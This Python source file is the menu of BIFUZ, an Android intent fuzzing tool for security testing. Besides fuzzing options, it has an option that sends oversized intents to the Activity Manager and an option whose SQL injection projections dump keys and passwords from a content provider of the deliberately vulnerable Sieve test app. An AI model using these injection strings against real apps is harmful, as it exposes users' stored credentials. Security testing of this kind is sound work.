#!/usr/bin/env python

# Menu of the BIFUZ project.
#
# Copyright (C) 2015 Intel Corporation
# Author: Andreea Brindusa Proca <andreea.brindusa.proca@intel.com>
# Author: Razvan-Costin Ionescu <razvan.ionescu@intel.com>
# Author: Cristina Stefania Popescu <cristina.popescu@intel.com>
#
# Licensed under the MIT license, see COPYING.MIT for details

import os
import re
from intent_bifuz import *	
from broadcast_bifuz import *
from common import *
from time import time
import random


def get_root_path(intents_file):
    '''
    Get the root path of the intent file.
    Used for running intents from the seed files.
    '''

    if intents_file[-1] == '/':
        intents_file = intents_file[:-1]
    intents_file = intents_file[:intents_file.rfind('/')]
    return intents_file


def get_intent_type(generated_intents_file):
    '''
    Verify if the seed file contains fuzzed intents or broadcast intents.
    Used for running intents from the seed fiels.
    '''

    if not os.path.isfile(generated_intents_file):
        print "This file does not exist: %s" % (generated_intents_file)
        return False
    ip = ''
    root_path = get_root_path(generated_intents_file)
    with open(generated_intents_file, 'r') as f:
        intent = f.readline()
        #regex to be reviewed
        try:
            ip_r = re.search("adb -s ([^ ]+) .*", intent)
        except:
            ip = ip_r.group(1)
        #quick fix until regex is reviewed for setting the IP
        ip = str(intent).split(" ")[2]
        if intent.startswith('adb'):
            if "-a" in intent:
                start_intent_fuzzer(ip, root_path, generated_intents_file)
            else:
                start_broadcast_fuzzer(ip, root_path, generated_intents_file)
    return True


def print_menu():
    os.system("clear")
    k = 15
    print("\n")
    print((k - 4) * " " + (2 * k + 2) * "=")
    print(k * " " + "###   #  ####  #  #  ####")
    print(k * " " + "#  #  #  #     #  #    ##")
    print(k * " " + "###   #  ####  #  #   ## ")
    print(k * " " + "#  #  #  #     #  #  #   ")
    print(k * " " + "###   #  #     ####  ####")
    print((k - 4) * " " + (2 * k + 2) * "=")
    print("\n\n")
    print(k / 2 * " " + "Select one option from below\n")
    print(k / 2 * " " + "1. Select Devices Under Test")
    print(k / 2 * " " + "2. Generate Broadcast Intent calls for the DUT(s)")
    print(k / 2 * " " + "3. Generate Fuzzed Intent calls")
    print(k / 2 * " " + "4. Generate a delta report between 2 \
fuzzing sessions")
    print(k / 2 * " " + "5. Run existing generated intents from file")
    print(k / 2 * " " + "6. SQL injections for specific apk.")
    print(k / 2 * " " + "7. (Future) Generate apks for specific Intent calls")
    print(k / 2 * " " + "8. Buffer overflow against Activity Manager - requires userdebug image")
    print(k / 2 * " " + "9. (WIP) Smart fuzzing - using a template - test gms package")
    print(k / 2 * " " + "Q. Quit")
    print("\n\n")


if __name__ == '__main__':
    print_menu()
    choice = str(raw_input("Insert your choice:    "))
    loop = True
    devices_list = []
    while loop:
		#option 1
        if (choice == "1"):
            print("\nYou have selected option 1. Select Devices Under Test")

            devices_list = get_devices_list()
            if not devices_list:
                print "*ERROR* unavailable devices"
                loop = False
                continue

            for i in range(len(devices_list)):
                print str(i + 1) + ". " + devices_list[i]

            duts = str(raw_input("Select the DUT number(s) separated by \
comma or type 'all': "))
            for d in duts.split(','):
                if d.isdigit():
                    duts_list = re.split(r'[,. ]+', duts)
                    devices_list = [devices_list[int(x) - 1] \
                       for x in duts_list if int(x) > 0 \
                       and int(x) <= len(devices_list)]
            if len(devices_list) > 0:
                print ("Selected DUT(s): " + ', '.join(devices_list))
            choice = str(raw_input("Insert your choice: "))
        
        #option 2    
        elif (choice == "2"):
            if len(devices_list) == 0:
                devices_list = get_devices_list()
                if devices_list is not False:
                    devices_list = [devices_list[0]]

            print("\nGenerate broadcast intent calls for the \
following DUT(s): " + ', '.join(devices_list) \
               if devices_list else 'Stop. Unavailable DUT')

            if not devices_list:
                loop = False
                continue

            packages = str(raw_input("Insert the packages wanted \
or type 'all' for all packages:    "))
            if not packages:
                print_menu()
            else:
                generate_broadcast_intent(devices_list, packages.strip())
                loop = False
                
        #option 3
        elif (choice == "3"):
            if len(devices_list) == 0:
                devices_list = get_devices_list()
                if devices_list is not False:
                    devices_list = [devices_list[0]]
            print("\nGenerate fuzzed intent calls \
for the following DUT(s): " + \
               ''.join(devices_list[0]) if devices_list \
               else 'Stop. Unavailable DUT')
            if not devices_list:
                loop = False
                continue
            packages = str(raw_input("Insert the wanted packages \
or type 'all' for all packages:    "))
            if not packages:
                print_menu()
            else:
                generate_fuzzed_intent(devices_list, packages.strip())
                loop = False
                
        #option 4
        elif (choice == "4"):
            print("\nYou have selected option 4. Generate a delta report\
between 2 fuzzing sessions")
            session_one = str(raw_input("Insert the absolute path \
for session one:    "))
            session_two = str(raw_input("Insert the absolute path \
for session two:    "))
            # testing reasons - to be deleted
            #session_one = '/home/andreeab/negative/bifuz/LOGS_6173B162_0115_17-13_broadcast'
            #session_two = '/home/andreeab/negative/bifuz/LOGS_6173B162_0115_17-34_broadcast'
            if not session_one or not session_two:
                continue
            delta_reports(session_one.strip(), session_two.strip())
            loop = False
            
        #option 5
        elif (choice == "5"):
            print("\nYou have selected option 5. Run existing generated \
intents from file.")
            intents_file = str(raw_input("Insert the absolute path of the \
file containing the intents:  "))
            #for testing reasons, to be deleted
            #intents_file = "/home/andreeab/negative/bifuz/LOGS_6173B162_0126_19-37_broadcast/all_broadcasts_6173B162.sh"
            if not intents_file:
                print_menu()
            else:
                get_intent_type(intents_file.strip())
                loop = False
                
        #option 6
        elif (choice == "6"):
            print("\nYou have selected option 6. SQL injections for specific apk.")
            if len(devices_list) == 0:
                devices_list = get_devices_list()
                if devices_list is not False:
                    devices_list = [devices_list[0]]

            print("\nGenerate sql injection for specific apk: " + ', '.join(devices_list) if devices_list else 'Stop. Unavailable DUT')

            if not devices_list:
                loop = False
                continue

            packages = str(raw_input("Insert the wanted package  "))
            if not packages:
                print_menu()
            else:
		#get all contents providers
                contents=get_apks(devices_list, packages.strip())
                print contents 
                select_key="'* FROM Key;--'"
                select_pass="'quote(password) FROM Passwords;--'"
                command_get_key="shell content query --uri content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection " + select_key; 
                command_get_pass="shell content query --uri content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection " + select_pass; 
		#get keys
                print command_get_key
                print "KEY and User  ";
                print run_inadb(devices_list[0], command_get_key)
                #get password
                print command_get_pass
                print "Passowords  ";
                print run_inadb(devices_list[0], command_get_pass)
            loop = False

        #option 7
        elif (choice == "7"):
            print("\nYou have selected option 7.Generate apks for specific Intent calls")
            #give the test folder with the seed files with intents
            seed_folder= str(raw_input("Insert the absolute path for the log folder:    "))
            
            if not seed_folder:
                print_menu()
            else:
                devices_list = get_devices_list()
                if not devices_list:
                    print "*ERROR* unavailable devices"
                    loop = False
                    continue
				#put seed folder on device             				
                copy_file_command='push ' + seed_folder +' /data/local/tmp/test/'
                print copy_file_command
                print run_inadb(devices_list[0], copy_file_command)
                #uninstall old apk if exists
                uninstall_command='shell pm uninstall -k ' +'org.test.bifuz'
                print run_inadb(devices_list[0], uninstall_command)
                #install apk
                install_command='-d install ' +'Bifuz-1.0.0-debug.apk'
                print run_inadb(devices_list[0], install_command)
                #start Bifuz
                run_command='shell am start -n org.test.bifuz/org.renpy.android.PythonActivity'
                print run_inadb(devices_list[0], run_command)
                logcat_cmd = "adb -s %s logcat -v time *:F > logcat_%s"%(devices_list[0], devices_list[0])
                os.system(logcat_cmd)
            loop = False   

        #option 8
        elif (choice == "8"):
			#buffer overflow against Activity Manager run on the first device in the list
			if len(devices_list) == 0:
				devices_list = get_devices_list()
				if devices_list is not False:
					devices_list = [devices_list[0]]
			repetitions = str(raw_input("How many large intents would like to send? (enter an int larger than 0) "))
			ip = str(devices_list[0])
			for i in range(int(repetitions)):
				buffer_overflow(ip)
			loop = False
		
		#option 9	
        elif (choice == "9"):
           print ("\nYou have selected option 9")
           #smart fuzzing - based on templates
           if len(devices_list) == 0:
               devices_list = get_devices_list()
               if devices_list is not False:
                   devices_list = [devices_list[0]]
           #WIP - IP is set for the first connected device
           ip = str(devices_list[0])
           template_edited = str(raw_input("Do you have created a template file? [y/n]: "))
           if str(template_edited) in ['y','Y']:
              pass
           else:
              os.system("python create_templates.py")
           
           
           #to be implemented - test for multiple packages
           '''
           test_pack = str(raw_input("Insert testing package: "))
           list_test_pack = []
           look_for_test_pack = getoutput("adb -s %s shell pm list packages | grep %s"%(ip,test_pack))
           for tp in look_for_test_pack.strip().split("package:"):
			   if tp!="":
				   list_test_pack.append(tp.strip())
           '''
           #test_pack - activity to be tested - for testing purposes we use all gms Activities
           
           with open(os.getcwd()+"/txts/gms_activities.txt","r") as f:
               gms_acts = f.readlines()
                      
           template_path = str(raw_input("Insert full path to the template file(s): "))
           tem = getoutput("ls %s/*.tem"%template_path)
           list_tem_files = tem.split()
           i=0
           for tem_file in list_tem_files:
               fuzzy_items = parse_template(tem_file)
               for test_p in gms_acts:
                   test_pack = test_p.strip()
                   fuzzy_intents = parse_string_for_lists("am start -n "+test_pack+" "+str(fuzzy_items),ip)       
                   #str(int(time))+"_"+
                   intent_from_template_folder = str(random.randint(1,10000)+i)+"_"+test_pack.split("/")[0]+"_"+test_pack.split(".")[-1]+"_"+tem_file.split("/")[-1].split(".tem")[0]
                   i+=1
                   previous_location = os.getcwd()
                   os.mkdir(intent_from_template_folder)
                   os.chdir(intent_from_template_folder)
                   for i in range(len(fuzzy_intents)):
                       filename = "intent_from_template"+str(i)
                       with open(filename,"w") as f:
                           f.write(fuzzy_intents[i])
                       os.system("chmod 777 "+filename)
                       #os.system("adb -s %s push "% (ip)+" "+filename+" /data/data/")
                       os.system("adb -s %s push "% (ip)+" "+filename+" /sdcard/")
                       #os.system("adb -s %s shell sh /data/data/%s"%(ip,filename))
                       os.system("adb -s %s shell sh /sdcard/%s"%(ip,filename))
                       os.system("adb -s %s shell log -p f -t %s" % (ip, str(fuzzy_intents[i])))
                   os.chdir(previous_location)
           loop = False
           
           
        #quit
        elif (str(choice) in ['q', 'Q']):
            print("\nThank you for using BIFUZ!")
            loop = False
        elif (choice != ""):
            print("\nYour option is invalid. Please type any number \
between 1 and 9, or Q for Quit")
            choice = str(raw_input("Insert your choice:    "))
